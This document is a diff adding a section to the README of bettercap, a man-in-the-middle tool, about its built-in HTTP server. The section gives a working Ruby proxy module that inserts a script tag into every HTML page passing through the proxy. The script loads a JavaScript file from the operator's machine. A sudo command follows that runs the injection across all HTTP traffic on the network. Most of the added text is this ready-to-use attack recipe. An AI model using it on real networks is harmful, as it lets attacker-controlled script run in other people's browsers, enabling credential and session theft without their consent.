@@ -115,6 +115,38 @@ class HackTitle < Proxy::Module
 end
 ```
 
+BUILTIN HTTP SERVER
+===
+
+You want to serve your custom javascript files on the network? Maybe you wanna inject some custom
+script or image into HTTP responses using a transparent proxy module but you got no public server
+to use? **no worries dude** :D  
+A builtin HTTP server comes with bettercap, allowing you to serve custom contents from your own
+machine without installing and configuring other softwares such as Apache, nginx or lighttpd. 
+
+You could use a **proxy module** like the following:
+
+```ruby
+class InjectJS < Proxy::Module
+  def on_request( request, response )
+    # is it a html page?
+    if response.content_type == 'text/html'
+      Logger.info "Injecting javascript file into http://#{request.host}#{request.url} page"
+      # get the local interface address and HTTPD port
+      localaddr = Context.get.iface[:ip_saddr]
+      localport = Context.get.options[:httpd_port]
+      # inject the js
+      response.body.sub!( '</title>', "<script src='http://#{localaddr}:#{localport}/file.js' type='text/javascript'></script></title>" )
+    end
+  end
+end
+```
+
+And then use it to inject the js file in every HTTP response of the network, using bettercap itself
+to serve the file:
+
+    sudo bettercap --httpd --http-path=/path/to/your/js/file/ --proxy --proxy-module=inject.rb 
+
 HOW TO INSTALL
 ===
 
